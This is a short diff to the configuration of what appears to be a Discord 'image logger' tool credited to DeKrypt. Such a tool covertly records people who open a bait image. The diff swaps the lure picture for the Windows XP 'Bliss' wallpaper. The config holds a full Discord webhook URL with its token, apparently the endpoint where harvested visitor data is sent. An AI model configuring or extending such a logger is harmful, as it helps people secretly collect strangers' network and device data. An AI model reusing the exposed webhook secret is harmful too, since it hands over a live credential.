@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334987731906068524/pNhOjgg5nNkX_rrzAceazOyLNv04cI0v-lC0AEe8XBcg2chv_R1GiYy1YZkUWyIS_3hR",
-    "image": "https://media.forgecdn.net/attachments/722/414/megalodaunt.png", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
